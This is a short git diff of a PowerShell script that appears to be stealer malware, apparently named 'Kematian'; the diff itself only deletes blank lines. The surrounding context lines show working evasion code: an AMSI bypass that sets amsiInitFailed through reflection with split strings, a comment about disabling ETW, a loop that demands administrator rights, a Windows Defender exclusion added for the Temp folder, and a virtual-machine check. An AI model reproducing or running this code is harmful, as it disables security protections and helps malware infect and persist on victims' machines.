@@ -55,9 +55,6 @@ function KDMUTEX {
     Invoke-TASKS
 }
 
-
-
-
 # Request admin with AMSI bypass and ETW Disable
 function CHECK_AND_PATCH {
     ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
@@ -66,7 +63,6 @@ function CHECK_AND_PATCH {
     $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
     return $kematiancheck
 }
-
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
@@ -102,7 +98,6 @@ function VMPROTECT {
 if ($vm_protect) {
     VMPROTECT
 }
-
 
 function Request-Admin {
     while (-not (CHECK_AND_PATCH)) {
